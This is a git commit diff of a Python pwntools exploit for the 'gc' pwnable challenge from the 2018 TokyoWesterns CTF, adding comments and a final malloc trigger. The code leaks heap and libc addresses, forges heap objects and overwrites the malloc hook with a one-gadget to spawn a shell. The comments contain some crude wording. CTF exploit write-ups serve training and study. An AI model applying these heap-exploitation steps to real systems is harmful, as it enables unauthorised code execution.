b47fc9249b58e8e4bdc883a19fadbf0efaf6574f
NakHyon Kim <mathboy7@naver.com>
2018-09-04 02:19:16 +0900

    Update gc.py

--- 2018 TokyoWesterns CTF/pwnable/gc.py
+++ 2018 TokyoWesterns CTF/pwnable/gc.py
@@ -73,7 +73,7 @@ print r.recvuntil("destination: ")
 r.sendline("")
 rv = r.recv(6)
 
-heap = u64(rv + "\x00\x00")
+heap = u64(rv + "\x00\x00") # leak heap address
 
 print "heap: " + hex(heap)
 
@@ -86,35 +86,39 @@ payload += "\x00"*16
 payload += p64(0x400) + p64(0x0)# size
 payload += p64(0x41414141) + "A"*4 + "\x00"*4 + "B"*50
 
-create("PPPP", payload)
-create("QQQQ", "C"*0x20) # we will overwrite QQQQ!
+create("PPPP", payload) # create fake object in shit1->AAAA
+create("QQQQ", "C"*0x20) # we will overwrite QQQQ with edit shit1->AAAA!
 
 payload = "B"*0x38 + "\x00"*16 + p64(0x80) + p64(0x0)
-payload += p64(heap-0x1c50+0x140) # stdin buffer + 0x300
+payload += p64(heap-0x1c50+0x140) # stdin buffer + 0x140, address of fake refList ptr
 payload += p64(0x51515151) + "AAAA" # name QQQQ
 
 edit("shit1", "AAAA", payload)
 
-payload = "A"*0x140 + p64(0x1) + p64(heap-0x698+0x58) + "\x00"*100
+payload = "A"*0x140 + p64(0x1) + p64(heap-0x698+0x58) + "\x00"*100 # make QQQQ->var's string point unsorted bin ptr to get libc addr
 create("fuckt", payload)
 
 r.sendline("5")
 r.sendline("QQQQ")
-r.sendline("\x81\x1d")
+r.sendline("\x81\x1d") # name (&unsortedbinaddr - 0x8, size=0x1d81, addr in heap)
 
 rv = r.recvuntil("\x7f")[-6:]
 libc = u64(rv + "\x00\x00")
 libc_base = libc - 0x3c4b78
 malloc_fake = libc_base + 0x3c4ae0
 
-payload = "A"*0x140 + p64(0x1) + p64(malloc_fake) + "\x00"*16
+payload = "A"*0x140 + p64(0x1) + p64(malloc_fake) + "\x00"*16 # overwrite fake refList to nearby malloc hook, size != 0.
 print "libc: " + hex(libc)
 
-create("fucktt", payload)
+create("fucktt", payload) # to give our input stdin buf
 
 r.sendline("2")
 r.sendline("QQQQ")
 r.sendline("")
-r.sendline(p64(libc_base+0x4526a))
+r.sendline(p64(libc_base+0x4526a)) # one-shot!
+
+r.sendline("1")
+r.sendline("shell")
+r.sendline("shell") # call malloc!
 
 r.interactive()
